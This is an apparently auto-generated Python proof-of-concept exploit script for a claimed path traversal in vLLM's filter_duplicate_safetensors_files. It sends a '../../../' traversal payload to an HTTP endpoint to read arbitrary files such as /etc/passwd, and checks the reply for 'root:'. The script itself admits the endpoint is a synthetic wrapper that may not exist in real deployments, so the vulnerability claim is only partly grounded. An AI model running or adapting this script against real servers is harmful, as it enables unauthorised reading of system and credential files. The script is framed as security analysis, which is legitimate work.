#!/usr/bin/env python3
# PoC for vllm-project-vllm-7193774 (/tmp/vllm-project-vllm-7193774)
# Path: suspicious-007
# Sink: filter_duplicate_safetensors_files
# Auto-generated — run with: python3 suspicious_verifier_pattern_evidence_llm_filter_duplicate_safetensors_files.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit Script for vllm-project-vllm-7193774

Vulnerability: Path traversal in filter_duplicate_safetensors_files (weight_utils.py).
The function joins an attacker-controlled `hf_folder` and `index_file` using os.path.join,
then opens the resulting path. An attacker who can control either parameter may read arbitrary
files (e.g., /etc/passwd) or trigger unintended behavior.

Note: This PoC assumes the vulnerable function is exposed via an API endpoint (synthetic wrapper).
In real vLLM deployments the function may not be directly reachable from untrusted input,
but we demonstrate the exploitation path for security analysis.

Usage:
    python poc.py [--target http://localhost:8000/api/v1/trigger] [--read /etc/passwd]
"""

import argparse
import json
import sys
import time

try:
    import requests
except ImportError:
    print("Error: This script requires the 'requests' library. Install with: pip install requests")
    sys.exit(1)


def exploit(target_url: str, file_to_read: str, timeout: int = 10):
    """
    Attempt path traversal by crafting malicious parameters.

    The vulnerable function expects:
        hf_folder: base directory (e.g., "/models/huggingface")
        index_file: name of index file inside hf_folder (e.g., "model.safetensors.index.json")

    We set hf_folder to a valid existing directory (if known, or default to "/tmp")
    and index_file to a path traversal string like "../../../etc/passwd".
    """
    # Use a safe default base directory; adjust if the server expects a specific path.
    base_dir = "/tmp"
    # Path traversal payload – try to read an arbitrary file
    traversal_payload = f"../../../{file_to_read.lstrip('/')}"

    payload = {
        "hf_folder": base_dir,
        "index_file": traversal_payload,
        # Some implementations might expect additional fields; keep it minimal
    }

    headers = {"Content-Type": "application/json"}

    print(f"[*] Targeting {target_url}")
    print(f"[*] Payload: hf_folder={base_dir!r}, index_file={traversal_payload!r}")

    try:
        response = requests.post(target_url, json=payload, headers=headers, timeout=timeout)
    except requests.exceptions.ConnectionError:
        print("[-] Connection failed. Is the server running?")
        return
    except requests.exceptions.Timeout:
        print("[-] Request timed out.")
        return
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        return

    print(f"[*] HTTP Status: {response.status_code}")
    print(f"[*] Response headers: {dict(response.headers)}")

    # If the exploit succeeds, the response body may contain the file content (e.g., JSON parse error)
    # or the server may return an error message including the read data.
    # Print the raw response for analysis.
    print(f"[*] Raw response body (first 500 chars):\n{response.text[:500]}")

    # Check for signs of successful file reading
    if "root:" in response.text or file_to_read.split("/")[-1] in response.text:
        print("[+] Possible path traversal success! Sensitive file content may be exposed.")
    else:
        print("[*] No clear evidence of file read. Server may have sanitized input or the endpoint is not vulnerable.")


def main():
    parser = argparse.ArgumentParser(description="PoC for vllm path traversal vulnerability")
    parser.add_argument(
        "--target",
        default="http://localhost:8000/api/v1/trigger",
        help="Target URL of the vulnerable endpoint (default: http://localhost:8000/api/v1/trigger)"
    )
    parser.add_argument(
        "--read",
        default="/tmp/poc_success.txt",
        help="File to attempt reading (benign default: /tmp/poc_success.txt)"
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=10,
        help="Request timeout in seconds (default: 10)"
    )
    args = parser.parse_args()

    # Benign file – exists only if the server is prepared; otherwise the PoC will still run safely.
    print("[*] Starting exploit – using benign payload by default. Change --read for testing.")
    exploit(target_url=args.target, file_to_read=args.read, timeout=args.timeout)


if __name__ == "__main__":
    main()
